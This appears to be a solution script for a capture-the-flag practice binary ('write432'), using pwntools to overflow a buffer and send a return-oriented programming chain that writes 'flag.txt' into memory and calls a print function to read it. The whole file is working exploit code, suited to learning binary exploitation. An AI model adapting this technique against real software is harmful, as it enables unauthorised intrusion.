from pwn import * 
io = process("./write432")

padding = b"A" * 44
printFilePlt = p32(0x080483d0)
movEdiEbp = p32(0x08048543)
popEdiEbp = p32(0x080485aa)
stringLocation = p32(0x804a050)
stringLocation2 = p32(0x804a050 + 4)

exploit = padding + popEdiEbp + stringLocation + b"flag" + movEdiEbp + popEdiEbp + stringLocation2 + b".txt" + movEdiEbp + printFilePlt + b"AAAA" + stringLocation 
io.send(exploit)
io.recvuntil(b"Thank you!\n")
print(io.recv().decode())
